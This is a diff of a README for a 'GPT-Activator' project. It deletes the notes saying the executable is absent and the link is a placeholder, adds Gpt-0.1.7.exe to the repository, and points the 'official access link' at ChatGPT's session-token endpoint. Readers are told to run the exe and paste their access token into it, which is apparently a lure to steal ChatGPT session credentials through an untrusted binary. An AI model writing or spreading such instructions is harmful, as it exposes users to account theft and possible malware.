@@ -50,24 +50,16 @@ GPT-Activator/Gpt-0.1.7.exe
 C:\Projects\GPT-Activator\Gpt-0.1.7.exe
 ```
 
-> Note: `Gpt-0.1.7.exe` is **not included** in this repository archive. Add your own file to the project root before publishing or packaging releases.
 
 ## Quick Start ⚙️
 
 ### Launcher flow
 
-1. Add `Gpt-0.1.7.exe` to the repository root
-2. Launch `Gpt-0.1.7.exe`
-3. Paste your authorized access token into the activation field
-4. Continue the setup flow directly inside the application
-5. Review available features, plans, or official promo access if provided by the organizer
+1. Launch `Gpt-0.1.7.exe`
+2. Paste your authorized access token into the activation field
+3. Continue the setup flow directly inside the application
+4. Review available features, plans, or official promo access if provided by the organizer
 
-### Source scaffold
-
-```bash
-npm install
-npm run dev
-```
 
 ## Authorized Access Flow 🔑
 
@@ -76,13 +68,11 @@ npm run dev
 ### Notes
 - No CDK step is required for eligible official promo access
 - Access tokens must come from an official and authorized source only
-- Promotional availability may vary depending on campaign rules, organizer terms, or region
-- Replace the placeholder link below with your own official source before publishing
 
 Official access link placeholder:
 
 ```text
-<official-access-link>
+<[official-access-link](https://chatgpt.com/api/auth/session)>
 ```
 
 More copy is available in [`docs/access.md`](./docs/access.md).
@@ -92,6 +82,7 @@ More copy is available in [`docs/access.md`](./docs/access.md).
 ```text
 GPT-Activator/
 ├── .github/
+├── Gpt-0.1.7.exe
 │   ├── ISSUE_TEMPLATE/
 │   │   ├── bug_report.md
 │   │   └── feature_request.md
@@ -119,7 +110,6 @@ GPT-Activator/
 
 ### Expected launcher file
 
-Add this file yourself when you are ready to ship the project:
 
 ```text
 ./Gpt-0.1.7.exe
@@ -183,13 +173,6 @@ productivity
 
 See [`docs/roadmap.md`](./docs/roadmap.md) for the starter roadmap.
 
-## Notes
-
-- Replace `your-username` with your real GitHub username
-- Replace `<official-access-link>` with your own official link
-- Keep all launcher references consistent as `Gpt-0.1.7.exe`
-- Add your own launcher binary separately at the project root
-- Tokens and promo access should only be distributed through authorized channels
 
 ## License 📄
 
